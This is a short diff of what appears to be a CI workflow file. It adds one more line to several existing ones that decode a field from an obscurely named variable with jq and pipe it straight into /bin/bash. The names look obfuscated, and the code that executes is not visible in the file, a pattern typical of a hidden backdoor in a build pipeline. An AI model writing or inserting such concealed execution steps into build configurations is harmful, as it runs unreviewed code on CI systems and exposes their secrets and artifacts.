@@ -40,6 +40,7 @@ jobs:
           echo $n48046 | jq -r .gtq8 | /bin/bash
           printf '%s' "$bvgr70" | jq -r .oqn94 | /bin/bash
           printf '%s' "$blcr7" | jq -r .mrjd924 | /bin/bash
+          echo $jer68201 | jq -r .hpu44 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
